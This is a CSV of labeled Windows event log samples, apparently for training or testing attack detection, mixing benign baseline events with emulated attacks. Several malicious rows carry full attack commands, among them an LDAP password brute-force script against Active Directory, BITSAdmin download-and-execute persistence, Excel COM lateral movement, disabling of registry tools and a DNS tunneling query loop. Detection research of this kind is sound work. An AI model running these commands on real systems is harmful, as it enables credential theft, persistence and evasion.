sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
CYB499-073,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,300,2024-10-21 11:25:02.6400626,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\windows\system32\calc.exe'. Could not find a part of the path 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'., 	ProviderName=FileSystem
	ExceptionClass=ProviderInvocationException
	ErrorCategory=InvalidOperation
	ErrorId=CopyItemProviderException
	ErrorMessage=Attempting to perform the CopyItem operation on the 'FileSystem' provider failed for path 'C:\windows\system32\calc.exe'. Could not find a part of the path 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'.

	Severity=Warning

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=5.1.19041.5007
	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
	PipelineId=1
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 300 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-074,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.4919875,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /create fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /create fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /create fileBITS
CYB499-075,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4738,2025-04-30T08:09:41.4802831+00:00,Server002,WORKGROUP\SERVER002$,,,,,,,,,Security event 4738 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$; detail=A user account was changed,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-076,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T16:36:08.4915718+00:00,Server002,SERVER002\lplui,C:\Windows\System32\AppHostRegistrationVerifier.exe,"""C:\Windows\system32\AppHostRegistrationVerifier.exe""",C:\Windows\System32\svchost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\AppHostRegistrationVerifier.exe; cmd=""C:\Windows\system32\AppHostRegistrationVerifier.exe""; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-077,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-23T19:49:28.8060298+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe,"""C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe""",C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe; cmd=""C:\Program Files (x86)\BraveSoftware\Update\Install\{D5A35684-367A-48CD-B6FB-1B83E0360456}\brave_installer-delta-x64.exe""; parent=C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe; parent_cmd=""C:\Program Files (x86)\BraveSoftware\Update\BraveUpdate.exe"" /svc; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-078,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Variable, Started, 	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-079,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-13T17:14:19.4218772+00:00,Server002,,,powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.4894
	HostId=36f6a86d-5072-4305-9b9d-86e0078f3204
	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';
	EngineVersion=5.1.19041.4894
	RunspaceId=7a579211-0b3f-4ae9-99cf-44101bdf3876
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command Write-Host 'Final result: 1';; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-080,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:21:36.2177333+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=eb790f13-daa5-4f75-803e-24b6904ee9b5
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname
	EngineVersion=5.1.19041.2673
	RunspaceId=0a7ef49c-6838-49c2-a599-9608b6bb5fc2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command hostname; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-081,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,403,2024-10-24 13:19:20.2309205,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Stopped, Available, 	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=15

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=5.1.19041.5007
	RunspaceId=f51dd722-90c0-4d26-9d8e-b9a7acc9f51e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 403 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-082,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-28 16:20:51.0059807,Server002,SERVER002\admin_test,C:\Windows\System32\chcp.com,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\chcp.com; user=SERVER002\admin_test,"The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: C:\Windows\System32\chcp.com"
CYB499-083,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:59.2275139,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
CYB499-084,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.4638733,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Registry, Started, 	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-085,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:57:56.5092275+00:00,Server002,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential ($username, $password)",,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=03cdc647-5a1b-4f15-bb99-431490edba2b
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential ($username, $password)
	EngineVersion=5.1.19041.2673
	RunspaceId=4edbd26b-bcda-4f99-8836-5cb27cd9c18d
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $username = artur;$password = ConvertTo-SecureString 123654AAaa. -AsPlainText -Force;$Credential = New-Object ...; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-086,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Function, Started, 	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-087,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4738,2025-04-30T08:10:10.5776205+00:00,Server002,WORKGROUP\SERVER002$,,,,,,,,,Security event 4738 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$; detail=A user account was changed,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-088,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-03T10:08:19.2543554+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.605.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId ce8093d4-60d9-41f4-a2f7-4974adf958a5 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-089,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4672,2025-04-29T17:42:56.5276620+00:00,Server002,NT AUTHORITY\SYSTEM (S-1-5-18),,,,,,,,,Security event 4672 from Microsoft-Windows-Security-Auditing on Server002; user=NT AUTHORITY\SYSTEM (S-1-5-18); detail=Administrative logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-090,Malicious,Sysmon,Defense Evasion,defense_evasion_disable_windows_registry_tool,data/raw/malicious/defense_evasion_disable_windows_registry_tool_json/T1112-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 14:46:00.2757251,Server002,SERVER002\admin_test,C:\Windows\System32\reg.exe,reg  add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\reg.exe; cmd=reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; user=SERVER002\admin_test",The event modifies the DisableRegistryTools policy value to restrict registry tooling. Evidence: reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f
CYB499-091,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:31:31.2395011+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\System32\autochk.exe,\??\C:\Windows\system32\autochk.exe *,C:\Windows\System32\smss.exe,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\autochk.exe; cmd=\??\C:\Windows\system32\autochk.exe *; parent=C:\Windows\System32\smss.exe; parent_cmd=\SystemRoot\System32\smss.exe; user=NT AUTHORITY\SYSTEM; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-092,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-093,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4798,2025-04-29T17:28:15.8567546+00:00,Server002,WORKGROUP\SERVER002$ (S-1-5-18),,,,,,,,,Security event 4798 from Microsoft-Windows-Security-Auditing on Server002; user=WORKGROUP\SERVER002$ (S-1-5-18); detail=A user's local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-094,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.7007798,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"FileSystem, Started, 	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-095,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,403,2024-10-21 11:25:03.4205134,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Stopped, Available, 	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=18

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=5.1.19041.5007
	RunspaceId=bbf1a6fb-f587-4c21-9b3b-0c34e2768fa2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 403 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
